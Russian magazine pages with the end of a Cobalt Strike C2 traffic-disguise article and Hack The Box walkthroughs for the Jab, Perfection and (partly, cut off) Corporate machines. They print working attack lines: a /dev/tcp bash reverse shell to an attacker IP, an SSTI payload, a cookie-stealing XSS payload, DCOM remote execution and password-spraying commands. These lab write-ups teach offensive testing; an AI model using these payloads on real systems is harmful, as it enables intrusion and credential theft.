В трафике нас выдает  только HTTP-заголовок Host, который не похож
на адрес xakep.ru. При пентесте или редтиминге оператор Cobalt Strike обыч‐
но выбирает какой‑нибудь ресурс, который могут часто смотреть сотрудники
тестируемой организации и который не вызовет подозрений.


        WWW

                        Полный шаблон профиля на GitHub




ВЫВОДЫ

При использовании C2-фреймворков важно понимать, как происходит вза‐
имодействие между маяком и сервером управления. Использование дефол‐
тных  настроек или параметров с GitHub может выдать злоумышленника
или пентестера, тогда как составление своих профилей неплохо помогает
скрыть присутствие.
ВЗЛОМ





В   этом    райтапе   нам    предстоит
получить 2,5 тысячи пользователей сервера
XMPP и валидировать их в Active Directory.
Затем  мы   найдем   учетные   данные
и получим сессию на сервере, используя             RalfHacker                                                                                             hackerralf8@gmail.com
механизм DCOM.  Повысить  привилегии
нам поможет вредоносный плагин для сер‐
вера Openfire.


Наша цель — получение прав суперпользователя на машине Jab с учебной
площадки Hack The Box. Уровень сложности — средний.


           WARNING

                            Подключаться к машинам с HTB рекомендуется
                            только через VPN. Не делай этого с компьютеров,
                        где есть важные для тебя данные, так как ты ока‐
                        жешься в общей сети с другими участниками.



РАЗВЕДКА

Сканирование портов
Добавляем IP-адрес машины в /etc/hosts:


10.10.11.4    jab.htb

И запускаем сканирование портов.

Справка: сканирование портов
Сканирование портов — стандартный первый шаг при любой атаке. Он поз‐
воляет атакующему узнать, какие службы на хосте принимают соединение.
На основе этой информации выбирается следующий шаг к получению точки
входа.
   Наиболее известный инструмент для сканирования — это Nmap. Улучшить
результаты его работы ты можешь при помощи следующего скрипта:


 #!/bin/bash
 ports=$(nmap -p- --min-rate= 500 $1 | grep ^[0-9] | cut -d '/' -f 1 |
 tr '\n' ',' | sed s/,$//)
 nmap -p$ports -A $1


Он действует в два этапа. На первом производится обычное быстрое ска‐
нирование, на втором — более тщательное сканирование, с использованием
имеющихся скриптов (опция -A).





                             Результат работы скрипта

Сканер нашел много открытых портов:
 • 53 — DNS;
 • 88 — Kerberos;
 • 135 — Microsoft RPC;
 • 139 — NetBIOS, NetLogon;
 • 445 — SMB;
 • 464 — служба смены пароля Kerberos;
 • 593 (HTTP-RPC-EPMAP) — используется в службах DCOM и MS Exchange;
 • 3268 (LDAP) — для доступа к Global Catalog от клиента к контроллеру;
 • 3269 (LDAPS) — для доступа к Global Catalog от клиента к контроллеру
   через защищенное соединение;
 • 5222, 5223, 5262, 5263, 5269 — серверы Jabber;
 • 5270, 7443 — XMPP;
 • 9389 — AD DS.

Разведка на SMB ничего не дала, поэтому попробуем найти что‑нибудь
на сервере Jabber.


ТОЧКА ВХОДА

Для подключения к серверу Jabber потребуется какой‑нибудь клиент, нап‐
ример Pidgin.
   Устанавливаем:


sudo apt install pidgin





                              Приветствие Pidgin

Так как у нас нет никаких учетных данных, создадим свою учетную запись.





                        Создание учетной записи





                 Создание учетной записи (продолжение)

После чего с созданной учетной записью регистрируемся на сервере.





                                Регистрация клиента

При присоединении к чату находим еще одно доменное имя.





                          Присоединение к чату

Добавим его в файл /etc/hosts.


10.10.11.4 jab.htb conference.jab.htb

Также можно получить список доступных комнат.





                              Список комнат

Когда все готово, можно поискать пользователей. Для этого нужно перейти
в меню «Учетные записи → Пользователь → Искать пользователей →
search.jab.htb». В поле Search указываем звездочку, чтобы искать любые
имена.





                            Поиск пользователей





                     Список найденных пользователей

Список оказался намного больше, чем я ожидал, поэтому нужно найти спо‐
соб сохранить свыше 2,5 тысячи пользователей в файл.


ТОЧКА ОПОРЫ

Закрываем Pidgin и запускаем его снова, но на этот раз в режиме отладки,
с сохранением логов в файл:


pidgin -d > log.txt

Повторяем все действия для получения списка пользователей и проверяем
файл.





                        Содержимое файла log.txt

Теперь из файла log.txt нужно вытащить имена пользователей и сохранить
в другой файл.


grep -oP '<value>\K[^<]+@jab.htb(?=</value>)' log.txt | cut -d '@' -f
1 | sort | uniq > users.txt

Когда все готово, можно перебрать этих полученных пользователей через
Kerbrute . Так мы убеждаемся в том, что пользователи реально существуют
в домене.


kerbrute_linux_amd64 userenum -d jab.htb --dc 10.10.11.4 -t 128 ./
users.txt





                                 Результат перебора

Почти все пользователи из списка присутствуют в домене. Так как у нас нет
никаких учетных данных, попробуем провести атаку AS-REP Roasting. Ее
смысл в том, что мы посылаем на сервер аутентификации анонимный запрос
для предоставления определенному пользователю доступа к какой‑либо
услуге. На что сервер выдает один из трех ответов:
 • предоставляет билет, из которого мы возьмем хеш;
 • отвечает,   что   у   данного   пользователя   не   выставлен   флаг
  UF_DONT_REQUIRE_PREAUTH;
 • говорит, что такого пользователя нет в базе Kerberos.

Выполнить можно при помощи скрипта impacket-GetNPUsers.


GetNPUsers.py jab.htb/ -usersfile users.txt





                            Результат проведения атаки

Таким образом, в домене есть пользователь, для которого не требуется
предварительная аутентификация Kerberos. Из справки узнаём, что для под‐
бора пароля в hashcat требуется режим 18200 (параметр -m).


hashcat --example | grep krb5asrep -B 11





                             Справка hashcat


hashcat -m 18200 hashes.txt rockyou.txt





                            Результат перебора пароля

Получив пароль, проверяем его валидность.


nxc smb 10.10.11.4 -u jmontgomery -p 'Midnight_121' --smb-timeout 5




                             Результат проверки пароля




                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
            HTB JAB
         ПРИМЕНЯЕМ AS-REP ROASTING
               ПРИ АТАКЕ НА WINDOWS





ПРОДВИЖЕНИЕ

Больше ничего интересного не находим, поэтому поищем мисконфиги, то
есть уязвимые конфигурации. В этом может помочь BloodHound. Эта тулза
сканирует LDAP и использует графы для выявления скрытых и часто неп‐
реднамеренных взаимосвязей в среде Active Directory или Azure. Это помога‐
ет легко идентифицировать очень сложные пути атаки, которые в противном
случае было бы невозможно быстро обнаружить. Для работы с данными нам
дополнительно нужно установить СУБД Neo4j. Или можно просто запустить
ее в Docker.


docker run -p7474:7474 -p7687:7687 -e NEO4J_AUTH=neo4j/_S3cr3T_ neo4j

Для сканирования из Linux будем использовать расширение для NetExec.
Но для  этого необходимо, чтобы FQDN-имя контроллера домена было
записано в файле /etc/hosts.


10.10.11.4 jab.htb conference.jab.htb DC01.jab.htb

А теперь используем NetExec с параметром --bloodhound.


nxc ldap 10.10.11.4 -u jmontgomery -p 'Midnight_121' -ns 10.10.11.4
--bloodhound




                    Сбор данных BloodHound

Но и тут ничего интересного. Однако есть сервис, куда мы еще не ходили
от имени скомпрометированного пользователя, — это сервер XMPP.





                          Окно авторизации XMPP

Проверяем доступные комнаты и находим новую — pentest2003.





                              Список комнат

Заходим в комнату и просматриваем историю чата. Там находим сообщение
с результатами перебора хеша с помощью hashcat.





                            Сообщения в чате

Забираем логин и пароль и проверяем учетные данные в домене.


nxc smb 10.10.11.4 -u svc_openfire -p '!@#$%^&*(1qazxsw'
--smb-timeout 3



                           Проверка учетных данных

Так у нас появился новый пользователь, помечаем его как Owned и перестра‐
иваем граф. Оказывается, пользователь состоит в группе DISTRIBUTED COM
USERS.





                       Граф BloodHound

Таким образом, наш юзер может использовать механизм DCOM. Посмотрим,
как обстоит дело с выполнением команд. Так как у нас нет возможности
читать файлы с ресурса SMB, результат выполнения команды мы получить
не сможем. Для теста запустим веб‑сервер Python на локальной машине
и через скрипт dcomexec из набора Impacket выполним запрос с удален‐
ного хоста при помощи curl.


dcomexec.py  -object MMC20 'jab.htb/svc_openfire:!@#$%^&*(1qazxsw'
@10.10.11.4 'curl 10.10.16.143/test_rce' -silentcommand




                     Выполнение команды через DCOM





                               Логи веб‑сервера

Запрос пришел, а  значит, команда выполнена. На  сайте Reverse  Shell
Generator сгенерируем реверс‑шелл PowerShell #3 (Base64).





                         Reverse Shell Generator

Затем на локальной машине запустим листенер:


rlwrap nc -nlvp 4321

И выполним реверс‑шелл через dcomexec.


dcomexec.py  -object MMC20 'jab.htb/svc_openfire:!@#$%^&*(1qazxsw'
@10.10.11.4 'powershell -r JAB.....' -silentcommand





                       Флаг пользователя


ЛОКАЛЬНОЕ ПОВЫШЕНИЕ ПРИВИЛЕГИЙ

Теперь нам необходимо собрать информацию. Я буду использовать для это‐
го скрипты PEASS.

Справка: скрипты PEASS
Что делать после того, как мы получили доступ в систему от имени поль‐
зователя? Вариантов дальнейшей эксплуатации и повышения привилегий
может быть очень много, как в Linux, так и в Windows. Чтобы собрать
информацию и наметить цели, можно  использовать  Privilege  Escalation
Awesome Scripts SUITE (PEASS) — набор скриптов, которые проверяют сис‐
тему на автомате и выдают подробный отчет о потенциально интересных
файлах, процессах и настройках.



В выводе скрипта много всего, поэтому пройдемся по наиболее многообе‐
щающим пунктам.
  В списке установленного программного обеспечения присутствует сер‐
вер Openfire.





                        Список установленного ПО

Среди  прослушиваемых  портов  отметим  9000  и  9001,  что  типично
для Openfire.




                        Прослушиваемые порты

Так как порт доступен только с локального хоста, необходимо туннелировать
трафик. Для этого будем использовать утилиту chisel. На локальном хосте
запустим   сервер,  ожидающий   подключения  (параметр  --reverse)
на порт 8888 (параметр --port):


./chisel.bin server --port 8888 --reverse

Теперь на удаленном хосте запустим клиентскую часть. Указываем адрес сер‐
вера и порт для подключения, а также настройку туннелирования: с локаль‐
ного порта 9090 на порт 9090 хоста 127.0.0.1.


chisel.exe client 10.10.16.143:8888 R:9090:127.0.0.1:9090

В логах сервера должны увидеть сообщение о создании сессии.





                                Логи chisel server

Когда туннель готов, можно просмотреть сайт через порт 9090 своего
локального хоста.





                     Форма авторизации Openfire

Для этого сервиса есть недавние CVE и даже опубликованный на GitHub экс‐
плоит для обхода аутентификации и дальнейшего получения RCE через заг‐
рузку плагина.





                         Поиск эксплоитов в Google

Обход аутентификации не  работает, однако получилось  авторизоваться
под учетной записью svc_openfire.





                          Главная страница Openfire

Попробуем получить RCE через загрузку плагина из того же репозитория.
Для этого переходим на страницу Plugins и загружаем плагин.





                            Страница Plugins

После загрузки плагина увидим описание, что пароль — 123.





                            Страница Plugins

Теперь через меню Server переходим к Server Settings → Management Tool.





                        Страница Management Tool

Нас встречает форма ввода пароля. Вводим 123 и получаем доступ к панели
выполнения команд.





                      Результат выполнения команды whoami

Так как мы работаем с максимальными привилегиями на хосте, можно про‐
читать флаг.





                           Флаг рута

Машина захвачена!
ВЗЛОМ





Сегодня я продемонстрирую, как обойти
фильтрацию   пользовательского   ввода
при инъекции в шаблон (SSTI) и в резуль‐
тате   получить   возможность   удаленно
выполнять код на сервере. При повышении             RalfHacker                                                                                             hackerralf8@gmail.com
привилегий используем возможности груп‐
пы sudo, для чего нам понадобится найти
учетные данные.


Наша цель — получение прав суперпользователя на машине Perfection
с учебной площадки Hack The Box. Уровень задания — легкий.


           WARNING

                            Подключаться к машинам с HTB рекомендуется
                            только через VPN. Не делай этого с компьютеров,
                        где есть важные для тебя данные, так как ты ока‐
                        жешься в общей сети с другими участниками.



РАЗВЕДКА

Сканирование портов
Добавляем IP-адрес машины в /etc/hosts:


10.10.11.253    perfection.htb

И запускаем сканирование портов.

Справка: сканирование портов
Сканирование портов — стандартный первый шаг при любой атаке. Он поз‐
воляет атакующему узнать, какие службы на хосте принимают соединение.
На основе этой информации выбирается следующий шаг к получению точки
входа.
   Наиболее известный инструмент для сканирования — это Nmap. Улучшить
результаты его работы ты можешь при помощи следующего скрипта:


 #!/bin/bash
 ports=$(nmap -p- --min-rate= 500 $1 | grep ^[0-9] | cut -d '/' -f 1 |
 tr '\n' ',' | sed s/,$//)
 nmap -p$ports -A $1


Он действует в два этапа. На первом производится обычное быстрое ска‐
нирование, на втором — более тщательное сканирование, с использованием
имеющихся скриптов (опция -A).





                             Результат работы скрипта

Сканер нашел всего два открытых порта:
 • 22 — служба OpenSSH 8.9p1;
 • 80 — веб‑сервер Nginx.

Так как с SSH без учетных данных ничего сделать нельзя, переходим к прос‐
мотру и тестированию сайта на веб‑сервере.





                           Главная страница сайта


ТОЧКА ВХОДА

На сайте находим пометку Powered by, из которой часто можно узнать, какой
используется движок. В нашем случае это WEBrick 1.7.0.





                            Powered by

На странице /weighted-grade находим несколько полей ввода и веб‑форму.





                  Содержимое страницы weighted-grade

На странице сказано, что нужно заполнить форму, при этом мы можем
использовать значения N/A для Category и ноль для Grade и Weight.





                          Заполненная веб‑форма

После отправки данных на сервер все введенные значения отображаются
на странице.





                         Содержимое страницы

Если введенные пользователем данные отображаются на странице, значит,
стоит  поискать  возможность  проэксплуатировать  это,  заслав  данные,
которые заставят сервер выполнить наши команды. Одна из таких воз‐
можностей — инъекция команд в шаблон.
   Без труда узнаём, что WEBrick написан на Ruby, и пробуем отправить пей‐
лоад, использующий особенности этого языка: <%= 7*7 %>.





                        Веб‑форма с данными





                         Содержимое страницы

В выводе вместо введенной нами строки или результата вычисления получа‐
ем сообщение о том, что заблокирован вредоносный ввод. Значит, исполь‐
зуется фильтр, который сигнализирует программе, что пользователь ввел
что‑то потенциально опасное.


ТОЧКА ОПОРЫ

Попробуем перебрать разные символы и последовательности, это даст нам
понимание того, на какие из них будет срабатывать фильтр, а какие помогут
его обойти. Начинаем со всех возможных символов в кодировке URLEncode.
   Перебирать будем с помощью очень удобного Burp Intruder. Для этого
в Burp History найдем запрос с отправкой данных на сервер и добавим его
в Burp Intruder комбинацией клавиш Ctrl-I. При помощи Ctrl-Shift-I переходим
к Burp Intruder.





                    Burp Intruder — вкладка Positions

В качестве словаря для перебора используем URI-hex из набора SecLists.





                    Burp Intruder — вкладка Payloads

Запускаем  сканирование, оно  закончится  слишком  быстро.  Сортируем
результат по длине ответа и видим несколько запросов, в ответ на которые
мы получили код 500. А еще один запрос имеет код 200 и не тот же, что у дру‐
гих, размер. При этом мы смогли обойти фильтр, и сервер вернул результат
выполнения нагрузки.





                                 Результат перебора

Сочетаниями клавиш Ctrl-R и Ctrl-Shift-R переносим запрос в Burp Repeater
и меняем нагрузку на ту, что выполнит какую‑нибудь команду. Например, id.


<%= IO.popen('id').readlines() %>

Перед отправкой запроса на сервер необходимо закодировать нагрузку
в формат URLEncode. Это можно сделать сразу в Burp комбинацией клавиш
Ctrl-U.





                          Результат выполнения запроса

Команда выполнена, а значит, есть возможность удаленного выполнения
кода (RCE). Закодируем реверс‑шелл в формат Base64:


echo -en 'bash -i >& /dev/tcp/10.10.16.143/4321 0>&1' | base64

Справка: реверс-шелл
Обратный шелл — это подключение, которое активирует атакуемая машина,
а мы принимаем и таким образом подключаемся к ней, чтобы выполнять
команды от лица пользователя, запустившего шелл. Для приема соединения
необходимо создать на локальной машине listener, то есть «слушатель».



Затем запускаем листенер:


pwncat-cs -lp 4321

И теперь вместо команды id отправляем вот такой однострочник:


echo YmFzaCAtaSA%2bJiAvZGV2L3RjcC8xMC4xMC4xNi4xNDMvNDMyMSAwPiYx
|base64 -d |bash

Это конвейер команд, который декодирует реверс‑шелл и выполняет его
в командной оболочке.





                       Флаг пользователя


ЛОКАЛЬНОЕ ПОВЫШЕНИЕ ПРИВИЛЕГИЙ

Мы получили доступ от имени пользователя, и теперь нам нужно собрать
информацию, которая поможет в дальнейшем продвижении. Я буду исполь‐
зовать для этого скрипты PEASS.

Справка: скрипты PEASS
Что делать после того, как мы получили доступ в систему от имени поль‐
зователя? Вариантов дальнейшей эксплуатации и повышения привилегий
может быть очень много, как в Linux, так и в Windows. Чтобы собрать
информацию и наметить цели, можно  использовать  Privilege  Escalation
Awesome Scripts SUITE (PEASS) — набор скриптов, которые проверяют сис‐
тему на автомате и выдают подробный отчет о потенциально интересных
файлах, процессах и настройках.



Загрузим на хост скрипт для Linux, дадим право на выполнение и запустим
сканирование. В выводе будет много информации, поэтому отберем только
значимую.
   Текущий пользователь состоит в группе sudo, а значит, может исполь‐
зовать sudo для выполнения команд в привилегированном контексте. Правда,
есть одно но: нам нужно знать пароль пользователя, а его у нас нет.





                           Базовая информация

В   системе   есть   доступный   для   чтения   файл   базы   данных
pupilpath_credentials.db.



                           Файлы credentials

В домашнем каталоге пользователя — множество файлов, в том числе
и файл истории SQLite.





          Список файлов root в домашних каталогах пользователя

Присутствуют на хосте и сообщения в каталоге /var/mail. Здесь часто мож‐
но найти важную информацию.



                      Файлы группы пользователя

Прочитаем сообщения в файле /var/mail/susan.


cat /var/mail/susan





                    Содержимое файла /var/mail/susan

В сообщении говорится о переходе на систему Jupiter Grades из‑за утечки
PupilPath и обсуждается вопрос с учетными данными для системы. Также рас‐
крывается формат паролей по умолчанию:


{имя пользователя}_{имя пользователя наоборот}_{случайное
сгенерированное число от 1 до 1 000 000 000}

При этом имя пользователя должно быть записано в нижнем регистре.
   Также  обратим  внимание на  найденный ранее файл базы  данных
pupilpath_credentials.db с учетными данными PupilPath. Воспользуемся
SQLite для просмотра данных в базе.


sqlite3 pupilpath_credentials.db
.tables





               Таблицы в базе данных pupilpath_credentials.db

В базе всего одна таблица — users. Просмотрим ее содержимое.


select * from users;





                         Данные в таблице users

Здесь сохранены только имена пользователей и хеши их паролей. Нас инте‐
ресует пароль пользователя Susan, так как он откроет дорогу к sudo. Поп‐
робуем определить  алгоритм хеширования,  воспользовавшись  утилитой
hashid.


hashid
abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f





                   Определение алгоритма хеширования

Скорее  всего, использован алгоритм хеширования SHA-256. Теперь мы
можем  попробовать  перебрать хеш  при помощи  hashcat  по  маске
susan_nasus_?d?d?d?d?d?d?d?d?d.


hashcat -m 1400 -a 3
abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f
susan_nasus_?d?d?d?d?d?d?d?d?d





                             Результат перебора хеша

Спустя несколько минут получаем пароль. Используем его в команде sudo su
для изменения контекста безопасности на root и забираем последний флаг.





                           Флаг рута

Машина захвачена!
ВЗЛОМ





В сегодняшнем прохождении нам встретит‐
ся обход CSP, эксплуатация XSS и IDOR,
поиск ошибок в коде  сайта, похищение
профиля Firefox, брут PIN от Bitwarden, соз‐
дание токена JWT и другие захватывающие             RalfHacker                                                                                             hackerralf8@gmail.com
приключения.


Наша цель — получение прав суперпользователя на машине Corporate
с учебной площадки Hack The Box. Уровень сложности — «безумный».


           WARNING

                            Подключаться к машинам с HTB рекомендуется
                            только через VPN. Не делай этого с компьютеров,
                        где есть важные для тебя данные, так как ты ока‐
                        жешься в общей сети с другими участниками.



РАЗВЕДКА

Сканирование портов
Добавляем IP-адрес машины в /etc/hosts:


10.10.11.246    corporate.htb

И запускаем сканирование портов.

Справка: сканирование портов
Сканирование портов — стандартный первый шаг при любой атаке. Он поз‐
воляет атакующему узнать, какие службы на хосте принимают соединение.
На основе этой информации выбирается следующий шаг к получению точки
входа.
   Наиболее известный инструмент для сканирования — это Nmap. Улучшить
результаты его работы ты можешь при помощи следующего скрипта:


 #!/bin/bash
 ports=$(nmap -p- --min-rate= 500 $1 | grep ^[0-9] | cut -d '/' -f 1 |
 tr '\n' ',' | sed s/,$//)
 nmap -p$ports -A $1


Он действует в два этапа. На первом производится обычное быстрое ска‐
нирование, на втором — более тщательное сканирование, с использованием
имеющихся скриптов (опция -A).





                             Результат работы скрипта

Сканер нашел всего один открытый порт — 80. На нем отвечает веб‑сервер
OpenResty 1.21.4.3. На главной странице нас встречает сайт, а также мы узна‐
ём реальный домен.





                           Главная страница сайта


ТОЧКА ВХОДА

Ниже на странице можно найти ссылку на другой ресурс, расположенный
на поддомене.





                 Ошибка запроса к support.corporate.htb

Чтобы получить доступ к ресурсу, добавим соответствующую запись в файл /
etc/hosts, а затем повторим обращение к support.corporate.htb.


10.10.11.246 corporate.htb support.corporate.htb





                   Главная страница support.corporate.htb

Мы нашли один поддомен, а значит, могут быть и другие. Проверить это легко
с помощью сканера ffuf.


Справка: сканирование веба c ffuf
Одно из первых действий при тестировании безопасности веб‑приложе‐
ния — это сканирование методом перебора каталогов, чтобы найти скрытую
информацию и недоступные обычным посетителям функции. Для этого можно
использовать программы вроде dirsearch и DIRB.
  Я предпочитаю легкий и очень быстрый ffuf. При запуске указываем сле‐
дующие параметры:
 • -w — словарь (я использую словари из набора SecLists);
 • -t — количество потоков;
 • -u — URL;
 • -H — HTTP-заголовок.

Чтобы в вывод утилиты не попадали абсолютно все варианты из списка, мож‐
но установить фильтр по размеру страницы (параметр -fs). Место перебора
помечается словом FUZZ.



Команда получается следующая:


ffuf -u "http://corporate.htb/" -H 'Host: FUZZ.corporate.htb' -t 128
-fs 175 -w subdomains-top1million-110000.txt





                       Результат сканирования поддоменов

Так мы открываем три новых поддомена, для которых нужно сделать запись
в /etc/hosts. Затем можем посмотреть соответствующие сайты.


10.10.11.246 corporate.htb support.corporate.htb git.corporate.htb
sso.corporate.htb people.corporate.htb





                      Главная страница git.corporate.htb





                     Главная страница sso.corporate.htb





                    Главная страница people.corporate.htb

К git доступ получить нельзя, people требует авторизации, а SSO обес‐
печивает единый механизм аутентификации для всех ресурсов. Возвращаем‐
ся к чату техподдержки и проверяем вставку тегов HTML.





                              Страница чата

Нагрузка со словом bolt, обернутым в тег <b>, сработала — слово отоб‐
ражено жирным шрифтом. Это значит, что можно попытать удачу с инъекцией
XSS.


ТОЧКА ОПОРЫ

XSS bypass CSP
Найти здесь XSS никак не получилось, а все из‑за политики CSP, о которой
можно узнать из ответа веб‑сервера.





                                 Ответ сервера

Content Security  Policy — это механизм обеспечения безопасности,
с помощью  которого можно защищаться от XSS-атак. CSP  описывает
доверенные источники для  загрузки ресурсов и  устанавливает правила
использования встроенных скриптов. Загрузка с ресурсов, не входящих
в белый список, блокируется. Таким образом, для эксплуатации XSS нужно
найти возможность закинуть код на один из ресурсов corporate.htb.
  В это время Burp Scanner определил возможность манипуляции содер‐
жимым JS-скрипта /assets/js/analytics.min.js через параметр v.





                            Запрос на сервер





                                 Ответ сервера

Также нашлась возможность менять содержимое страницы 404 главного сай‐
та, что позволяет вставить теги <script> и перейти к уязвимости Self-XSS.





                            Запрос на сервер





                                 Ответ сервера

Таким образом, в файл /assets/js/analytics.min.js можно вставить свой
JavaScript-код, который будет отправлять на наш сервер cookie пользователя.


http://corporate.htb/assets/js/analytics.min.js?v=document.
location=`http://10.10.16.36/${document.cookie}`





                          Ответ сервера с нагрузкой

Затем этот скрипт можно загружать в теге <script> через страницу 404 глав‐
ного сайта и приводить нагрузку в действие.


http://corporate.htb/<script+src='/vendor/analytics.min.js'></script>
<script+src='/assets/js/analytics.min.js?v=document.location=`http://
10.10.16.36/${document.cookie}`'></script>

Чтобы пользователь автоматически переходил по этой ссылке, используем
HTML-инъекцию тега <meta> с параметром http-equiv="refresh".


<meta http-equiv="refresh" content="0;url=http://corporate.htb/<
script+src='/vendor/analytics.min.js'></script><script+src='/assets/
js/analytics.min.js?v=document.location=`http://10.10.16.36/${
document
.cookie}`'></script>">

Запускаем веб‑сервер:


python3 -m http.server

И отправляем нагрузку в чат. Как только пользователь просмотрит сооб‐
щение, он автоматически будет перенаправлен на http://corporate.htb/,
где через Self-XSS загрузится скрипт /vendor/analytics.min.js со встро‐
енной JS-нагрузкой для кражи печенек.





                               Логи веб‑сервера

Так как каждый новый чат будет со случайным сотрудником техподдержки,
можно получать cookie разных пользователей.


IDOR + Broken Access Control
Чтобы полученные cookie автоматически применялись на всех сайтах, заг‐
ружаемых через Burp Proxy, нужно открыть настройки прокси и указать их
в разделе Match and replace rules.





                             Настройки Burp Proxy





                       Главная страница сайта People




                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
      HTB CORPORATE
             ЭКСПЛУАТИРУЕМ SELF-XSS,
             БРУТИМ PIN ОТ BITWARDEN
               И ПОДДЕЛЫВАЕМ JWT




На странице Sharing можно найти несколько файлов, в том числе конфиг
OpenVPN. Офисные документы ничего интересного не содержат.





                      Содержимое страницы Sharing

Так как обращение к файлу происходит через его идентификатор, стоит
перебрать другие значения ID: доступ к файлам может не контролироваться.
Однако в этот раз ничего не получилось. В дополнение к обнаруженному
можно отметить функцию, которая позволяет поделиться файлом с другим
пользователем.
  На странице Chat есть только окно чата для внутренних пользователей.
При клике на пользователя можно просмотреть его профиль.





                       Содержимое страницы Chat





                        Профиль пользователя

Больше на сайте ничего интересного найти не удалось, поэтому вернемся
и посмотрим, какие возможности дает загрузка и шеринг файла. Чтобы войти
от имени любого другого пользователя, можно украсть рандомные cookie
через XSS и применить в Burp Proxy.





                     Профиль другого пользователя

Через форму загрузки ничего интересного сделать не получилось. А вот что‐
бы поделиться файлом, серверу нужно указать ID файла и почтовый адрес
пользователя, которому будет открыт доступ.





                         Файлы пользователя





                        Запрос для шеринга файла

Хотя сервер проверяет, можно ли тому или иному пользователю получить
доступ к определенному файлу, при шеринге это разрешение может и не
действовать. Чтобы попробовать поделиться всеми файлами, можно через
Burp Intruder перебрать их ID в запросе на шеринг.





                    Burp Intruder — вкладка Positions





                    Burp Intruder — вкладка Payloads

Когда все запросы в Burp Intruder выполнены, снова проверяем файлы поль‐
зователя и находим там большой список документов.





                         Файлы пользователя

Среди бесполезных файлов DOCX есть один интересный файл в формате
PDF.


Сбор информации
В PDF есть шаблон устанавливаемых для пользователей паролей. Пароли
составляются по простой схеме: строка CorporateStarter и дата рождения
пользователя.





                       Содержимое документа PDF

Дату рождения пользователя легко найти в его профиле. Можем через Burp
Intruder перебрать профили всех пользователей и выбрать на страницах их
имена и даты рождения.





                    Burp Intruder — вкладка Positions





                    Burp Intruder — вкладка Payloads

Для выбора имени пользователя и даты рождения следует использовать
опцию grep → Extract.





                       Выбор имени пользователя





                         Выбор даты рождения





                                   Результат атаки

Получаем таблицу с данными, и теперь нужно выбрать результаты для всех
пользователей. Сохраняем и в появившемся окне выбираем только столбцы
с именами и датами рождения. В качестве разделителя выбираем запятую.





                        Сохранение результатов

Теперь нужно найти сервисы, в которые можно попытаться залогиниться.
Подключаемся к VPN, используя скачанный конфиг, и просматриваем добав‐
ленные маршруты. Это нужно для определения новых сетей, к которым откры‐
вается доступ.


sudo openvpn candido-hackett.ovpn





                                 Логи OpenVPN

Нам доступны сети 10.8.0.0/24 и 10.9.0.0/24. Сначала просканируем их
и найдем живые хосты. Nmap с опцией -sn выполнит перебор всех хостов
в сети.


nmap -sn 10.8.0.0/24 --min-rate= 200





                     Результат сканирования сети 10.8.0.0/24


nmap -sn 10.9.0.0/24 --min-rate= 500





                     Результат сканирования сети 10.9.0.0/24

Теперь нужно просканировать порты на найденных хостах. Для этого исполь‐
зуем уже знакомый скрипт, который я приводил в начале статьи.





                  Результат сканирования портов хоста 10.8.0.1





                  Результат сканирования портов хоста 10.9.0.4

Адреса 10.8.0.1 и 10.9.0.1 принадлежат одному хосту, поэтому далее
работать будем только с одним из них.


Шаблонные пароли
На хосте 10.9.0.4 работают службы SSH (порт 22) и NFS (порт 111). Первым
делом нужно перебрать учетные данные на SSH. Но сперва надо собрать
списки логинов и паролей.
   Сначала из файла с сохраненными результатами сканирования Burp
Intruder (names) нам нужно отдельно выбрать имена и даты. Имена сложим
в файл username.txt, даты — в date.txt.


cat names | cut -d , -f 1 > username.txt
cat names | cut -d , -f 2 > date.txt

Теперь для каждой даты нужно сделать пароль по формату, который мы узна‐
ли ранее.


while IFS= read -r line; do
   formatted_date=$(date -d "$line" +"CorporateStarter%d%m%Y" 2>/dev/
null)
   echo "$formatted_date"
done < date.txt

Когда у нас есть файлы с именами и паролями, их можно использовать
для брута службы SSH с помощью утилиты NetExec. Чтобы не перебирались
все возможные сочетания логинов и паролей, используй опцию --no-
bruteforce. При этом, чтобы перебор продолжался после обнаружения пер‐
вой валидной учетки, следует использовать опцию --continue-on-success.


nxc ssh 10.9.0.4 -u username.txt -p password.txt --no-bruteforce
--continue-on-success





                        Результат подбора учетных данных

В итоге находим четыре пары из логинов и паролей. Чтобы определить, какая
предпочтительнее для дальнейшей работы, просмотрим контекст каждой
учетной записи. Для этого выполним команды id и ls через опцию -x.


nxc ssh 10.9.0.4 -u nya.little -p CorporateStarter21061965 -x 'id ;
ls'





                      Проверка контекста пользователей

Пользователь elwin.jones входит в группу it, при этом у него есть окру‐
жение рабочего стола Linux. Продолжим работу именно с этой учетной
записью.




                       Флаг пользователя




                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
      HTB CORPORATE
             ЭКСПЛУАТИРУЕМ SELF-XSS,
             БРУТИМ PIN ОТ BITWARDEN
               И ПОДДЕЛЫВАЕМ JWT





ХОСТ WORKSTATION-04

Сбор информации
Теперь нам необходимо собрать информацию. Я буду использовать для это‐
го скрипты PEASS.

Справка: скрипты PEASS
Что делать после того, как мы получили доступ в систему от имени поль‐
зователя? Вариантов дальнейшей эксплуатации и повышения привилегий
может быть очень много, как в Linux, так и в Windows. Чтобы собрать
информацию и наметить цели, можно  использовать  Privilege  Escalation
Awesome Scripts SUITE (PEASS) — набор скриптов, которые проверяют сис‐
тему на автомате и выдают подробный отчет о потенциально интересных
файлах, процессах и настройках.


Загрузим на хост скрипт для Linux, дадим право на выполнение и запустим
сканирование. В выводе будет много информации, попробуем выбрать толь‐
ко то, что потенциально приблизит нас к эскалации прав.
  В домашнем каталоге пользователя есть каталог с профилем браузера
Firefox.





              Список файлов с возможными учетными данными

В системе активный сокет /run/docker.sock, который можно использовать
для повышения привилегий.





                           Активные Unix-сокеты

Проверяем права на этот сокет и видим, что возможность чтения и записи
есть у группы engineer. Сразу отметим ее как потенциальную цель.




                         Права на /run/docker.sock

В профиле  Firefox можно  найти установленное расширение менеджера
паролей Bitwarden.





                     Расширения в профиле Firefox

Скачиваем на локальный хост каталог tr2cgmb6.default-release профиля
браузера для дальнейшего анализа.


it → engineer
Crack Bitwarden PIN
Скачиваем каталог с профилем и запускаем на локальной машине Firefox,
указав при запуске полученный профиль.


firefox --profile tr2cgmb6.default-release

В истории запросов можно обнаружить, что пользователь устанавливал рас‐
ширение Bitwarden и даже интересовался PIN-кодом от хранилища.





                            История браузера

Если запустить расширение Bitwarden, у нас сразу будет запрошен PIN
